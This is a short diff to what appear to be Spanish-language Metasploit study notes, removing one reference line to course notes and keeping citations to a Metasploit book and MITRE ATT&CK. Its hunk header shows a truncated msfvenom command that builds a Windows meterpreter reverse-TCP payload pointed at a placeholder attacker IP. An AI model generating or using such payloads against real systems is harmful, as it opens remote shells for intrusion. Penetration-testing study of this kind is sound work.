@@ -46,4 +46,3 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -e x8
 ## Referencias
 - Rahalkar, S. (2017). *Metasploit for Beginners*. Packt Publishing.
 - MITRE Corporation. (2024). ATT&CK Technique T1587.001: Develop Capabilities: Malware. https://attack.mitre.org/techniques/T1587/001/
-- Notas del proyecto: notas-md/INE Courses/INE Courses/Metasploit Framework.md
